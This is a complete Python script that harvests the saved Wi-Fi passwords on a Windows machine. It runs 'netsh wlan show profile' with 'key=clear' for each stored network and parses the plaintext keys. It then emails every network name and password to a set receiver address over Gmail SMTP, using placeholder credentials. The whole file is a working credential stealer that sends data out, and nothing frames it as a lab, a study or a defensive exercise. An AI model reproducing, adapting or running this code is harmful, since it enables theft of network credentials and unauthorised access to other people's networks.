# -*- coding: utf-8 -*-

import subprocess

s = subprocess.run(["netsh","wlan","show","profile"],capture_output=True)
s = str(s.stdout)
l = []
i=0
while i<len(s):
    if s[i]==':':
        i+=2
        temp = ""
        while s[i]!='\\':
            temp = temp + s[i]
            i+=1
        l.append(temp)
    else:
        i+=1
l = l[1:]


passwords = []
for x in l:
    s = subprocess.run(["netsh","wlan","show","profile","name="+x,"key=clear"],capture_output=True)
    s = str(s.stdout)
    word = "Key Content"    # depends on shell language
    found = False
    i=0
    c=0
    while i<len(s) and not found:
        if s[i]==word[c]:
            while c<len(word) and s[i]==word[c]:
                i+=1
                c+=1
            if c==len(word):
                while not found:
                    if s[i]==':':
                        i+=2
                        temp = ""
                        while s[i]!='\\':
                            temp = temp + s[i]
                            i+=1
                        passwords.append((x,temp))
                        found = True
                    else:
                        i+=1
        else:
            i+=1

import smtplib, ssl

port = 465  # For SSL
smtp_server = "smtp.gmail.com"
sender_email = "myfakeemail@gmail.com"  # Enter your address
password = "mypassword"

receiver_email = "myemail@gmail.com"  # Enter receiver address
message = """\
Subject: passwords

"""+str(passwords)

# Create a secure SSL context
context = ssl.create_default_context()

with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
    server.login("myfakeemail@gmail.com", password)
    server.sendmail(sender_email, receiver_email, message)
